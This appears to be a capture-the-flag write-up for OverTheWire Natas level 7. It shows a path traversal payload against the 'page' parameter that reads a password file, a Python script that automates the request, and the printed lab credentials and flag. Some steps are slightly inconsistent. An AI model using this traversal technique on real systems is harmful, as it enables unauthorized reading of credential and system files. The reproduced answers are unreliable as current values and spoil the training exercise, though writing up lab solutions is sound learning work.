# Natas Level 7 Writeup (natas7) – OverTheWire

## Overview

This level focuses on exploiting a file inclusion vulnerability through a URL parameter.     
The goal is to find the password for the next level.

## Observation

When we open the website, we see two links:
- Home
- About

Clicking them changes the URL parameter:
```
index.php?page=home
index.php?page=about
```

This suggests that the `page` parameter is used to include files dynamically.

## Finding the Password

### Using Browser
1. Inspect page source and identify a hint:
    ```
    <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
    ```
2. The application use `page` parameter to include file:
    ```
    index.php?page=home
    ```
3. Attempt path traversal to reveal natas7 password:
    ```
    index.php?page=../../../../etc/natas_webpass/natas8
    ```
4. The server includes the file and displays the password.

#### Proof
```text
natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

5. Enter this secret in the input field to retrieve the password.

### Using Python

```python
import requests, re

url = "http://natas7.natas.labs.overthewire.org/"
auth = ("natas7", "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS")

# # step 1: Retrieve the hint and two links for Home and About
# res = requests.get(url, auth=auth)
# match = re.search(r'<a.*-->', res.text, re.DOTALL)
# print(match.group(0))

payload = {
    "page" : "../../../../etc/natas_webpass/natas8"
}

res = requests.get(url, auth=auth, params=payload)
match = re.search(r'<br>\W(\w+)', res.text)
print(f'Password for natas 8 is: {match.group(1)}')
```

## Vulnerability

The application includes files based on user-controlled input without proper validation, leading to a Local File Inclusion (LFI) vulnerability.

## Flag
`xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

